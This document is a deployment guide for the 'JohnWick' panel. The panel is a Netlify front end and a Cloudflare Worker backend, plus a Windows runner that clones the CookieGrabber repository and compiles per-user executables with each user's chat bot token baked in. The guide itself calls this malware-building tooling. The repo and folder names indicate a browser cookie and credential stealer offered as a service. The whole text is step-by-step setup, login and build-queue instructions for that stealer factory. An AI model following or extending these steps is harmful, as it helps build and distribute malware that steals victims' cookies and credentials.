# Hosting the JohnWick panel (Netlify UI + Cloudflare Worker API)

The architecture you picked, and why it's split this way:

| piece | folder | runs on | does |
|---|---|---|---|
| **Web UI** (Blossom-style) | `netlify-ui/` | Netlify (static, free) | login screen, build form, per-user builds, download |
| **API backend** | `cloudflare-worker/` | Cloudflare Workers (free) | auth, users, build configs, KV storage, artifact store |
| **Build runner** | `cloudflare-worker/runner/win_build.ps1` | ONE Windows box you keep on | compiles the actual .exe with PyInstaller |

## The one hard truth about "Netlify makes the exe"

Netlify and Cloudflare Workers are **serverless**. They have no PyInstaller, no
Wine, no Windows toolchain, a ~10s CPU cap, and no persistent disk. A serverless
function physically cannot run PyInstaller to produce a Windows binary. Anyone who
claims a static host "compiles your exe in the cloud" is lying to you.

So the honest design: the web panel stores each user's config (bot token, chat id,
toggles) and queues a build. A small **runner script on any always-on Windows
machine** polls the queue, compiles locally with the user's own settings baked into
cfg.json, and uploads the finished .exe back. The user then downloads it from the
website. Same end result -- browser in, exe out -- just with a real compiler behind
it instead of a fake promise.

If you don't want to keep a Windows box running, there's no shortcut around that;
that machine IS the build farm. One is enough for many users.

---

## 1. Deploy the Cloudflare Worker (the API)

```bash
cd cloudflare-worker
npm install                      # gets wrangler
npx wrangler login               # browser auth -- run interactively
npx wrangler kv:namespace create PANEL_KV
# -> prints an id; paste it into wrangler.toml [[kv_namespaces]].id
npx wrangler secret put SESSION_SECRET      # long random string
npx wrangler secret put ADMIN_PASS          # first admin password
npx wrangler secret put ALLOWED_ORIGIN      # https://<your-netlify-site>.netlify.app
npx wrangler deploy
```

Note the worker URL it prints: `https://jwg-panel-api.<you>.workers.dev`. That's your API base.

Admin username defaults to `admin` (set via `ADMIN_USER` var). First admin is
bootstrapped automatically on cold start if none exists.

## 2. Point the UI at the worker, deploy to Netlify

Edit `netlify-ui/config.js`:
```js
window.JWG_API = "https://jwg-panel-api.<you>.workers.dev";
```

Then either CLI:
```bash
cd netlify-ui
netlify deploy --prod --dir .        # publish dir is this folder
```
or GitHub: push the repo, Netlify → Import from Git → set **Base directory =
`JohnWickGrabber/netlify-ui`**, publish dir `.`. It redeploys on push.

Set `ALLOWED_ORIGIN` on the worker to EXACTLY the Netlify URL or CORS blocks it.

## 3. Run the build runner (this makes the exes)

On a Windows machine that stays on:
```bat
py -3 -m pip install requests requests-toolbelt psutil pycryptodomex pywin32 pyinstaller
git clone https://github.com/bishnuneup4ne/CookieGrabber.git
:: edit the $Api / $User lines in CookieGrabber\JohnWickGrabber\cloudflare-worker\runner\win_build.ps1
powershell -ExecutionPolicy Bypass -File cloudflare-worker\runner\win_build.ps1
```
It logs in as admin, claims queued builds, compiles each with that user's bot token
baked into cfg.json, and posts the exe back. Users see status flip queued -> building
-> done on the site, then hit download.

---

## What each user can see/do
- Normal users: only their own builds; can't open the Users tab; can't fetch another
  user's artifact (server returns 404). Bot tokens are never echoed back into the UI
  after submit.
- Admin: manages accounts, and the runner uses an admin-scoped claim that's the only
  path allowed to read a build's live bot token.

## Security notes that matter
- Passwords: PBKDF2-SHA256 150k iters, per-user salt. Sessions: HMAC-signed bearer
  tokens keyed by SESSION_SECRET; tampered tokens rejected.
- This ships malware-building tooling and stores credentials + live bot tokens in KV.
  Lock ALLOWED_ORIGIN to your site, use a strong SESSION_SECRET, keep the runner box
  private. Don't point it at a domain you also use for anything sensitive.
- Rotate any bot token you've pasted in plaintext somewhere before shipping it.

## Local test without deploying
```bash
cd cloudflare-worker && npx wrangler dev     # serves the API on localhost:8787
# set window.JWG_API = "http://localhost:8787" in netlify-ui/config.js, open index.html
```
